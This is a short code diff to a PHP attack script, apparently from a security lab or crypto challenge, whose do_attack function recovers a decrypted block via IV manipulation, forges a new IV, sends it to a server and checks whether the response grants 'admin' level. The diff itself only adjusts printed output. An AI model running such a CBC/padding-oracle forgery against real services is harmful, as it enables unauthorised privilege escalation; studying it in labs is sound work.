@@ -181,13 +181,13 @@ function do_attack ($iv_string_b64, $token, $url) {
 
 	print "Real IV is: " . byte_array_to_string ($init_iv) . "\n";
 	print "Zeroing array is: " . byte_array_to_string ($zeroing) . "\n";
+	print "\n";
 
 	$x = xor_byte_array ($init_iv, $zeroing);
 	print "Decrypted string with padding: " . byte_array_to_string ($x) . "\n";
 	$number_of_padding_bytes = $x[15];
 	$without_padding = array_slice ($x, 0, 16 - $number_of_padding_bytes);
-	print "\n";
-	print "Decrypted string dump: " . byte_array_to_string ($without_padding) . "\n";
+	print "Decrypted string without padding: " . byte_array_to_string ($without_padding) . "\n";
 
 	$str = '';
 	for ($i = 0; $i < count ($without_padding); $i++) {
@@ -222,12 +222,14 @@ function do_attack ($iv_string_b64, $token, $url) {
 	}
 
 	print "New IV is: " . byte_array_to_string ($zeroing) . "\n";
+	print "\n";
 
 	print "Sending new data to server\n";
 
 	try {
 		$ret_obj = make_call ($token, $zeroing, $url);
 
+		print "Response from server:";
 		var_dump ($ret_obj);
 
 		if ($ret_obj['status'] == 200 && $ret_obj['level'] == "admin") {
